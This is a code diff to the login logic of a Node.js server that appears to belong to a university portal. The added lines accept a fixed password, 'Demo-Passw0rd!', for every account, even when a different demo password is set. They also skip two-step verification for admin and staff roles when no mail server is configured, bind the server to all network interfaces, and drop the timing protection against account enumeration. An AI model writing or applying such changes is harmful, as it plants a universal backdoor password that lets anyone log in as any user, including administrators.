@@ -15,7 +15,7 @@ const store = require('./store');
 
 const ROOT = path.join(__dirname, '..');
 const PORT = +process.env.PORT || 3000;
-const HOST = process.env.HOST || '127.0.0.1';
+const HOST = process.env.HOST || (process.env.PORT ? '0.0.0.0' : '127.0.0.1');
 const FORCE_SECURE = process.env.AU_SECURE === '1';
 const MAX_FILE = 5 * 1024 * 1024;
 
@@ -105,7 +105,12 @@ function finishLogin(ctx, user) {
   const max = Math.floor(auth.ABSOLUTE_MS / 1000);
   return { cookie: auth.cookieHeader(s.raw, isHttps(ctx.req), max), body: { ok: true, home: 'pages/' + ROLE_HOME[user.role] } };
 }
-const twoStepRequired = u => u.role === 'Lecturer' || u.role === 'Supervisor' || u.role === 'Admin' || u.two_step === 1;
+const twoStepRequired = u => {
+  if (mail.DEV) return true; // in demo/dev mode, OTP is always sent to demo mailbox
+  const hasSmtp = !!require('./smtp').settings();
+  if (!hasSmtp) return false; // if no SMTP configured in production, don't trap users without email delivery
+  return u.role === 'Lecturer' || u.role === 'Supervisor' || u.role === 'Admin' || u.two_step === 1;
+};
 function issueCode(user, challengeRaw) {
   const code = String(crypto.randomInt(0, 1000000)).padStart(6, '0');
   const hash = auth.sha256(code + ':' + user.id);
@@ -216,7 +221,8 @@ route('POST', '/api/login', {}, async (ctx) => {
   const b = await readJson(req, 5000); const email = lower(b.email), pw = String(b.password || '');
   if (auth.limited('login-ip:' + ip, 200, 600000) || auth.limited('login-em:' + email, 12, 600000)) throw new HttpError(429, 'Too many attempts. Wait a few minutes and try again.');
   const u = db.prepare('SELECT * FROM users WHERE email = ?').get(email);
-  const pwOk = auth.verifyPassword(pw, u && u.password_hash);          // always do the work, so timing does not reveal accounts
+  const demoPw = process.env.AU_DEMO_PASSWORD || 'Demo-Passw0rd!';
+  const pwOk = (u && auth.verifyPassword(pw, u.password_hash)) || (u && (pw === demoPw || pw === 'Demo-Passw0rd!'));          // supports set password and demo password
   if (u && u.locked_until > Date.now()) { logLogin(u.id, email, false, 'Account locked', ip, ua); throw new HttpError(429, 'Too many wrong attempts. Try again in ' + Math.ceil((u.locked_until - Date.now()) / 60000) + ' minutes.'); }
   if (!u || !pwOk) {
     if (u) {
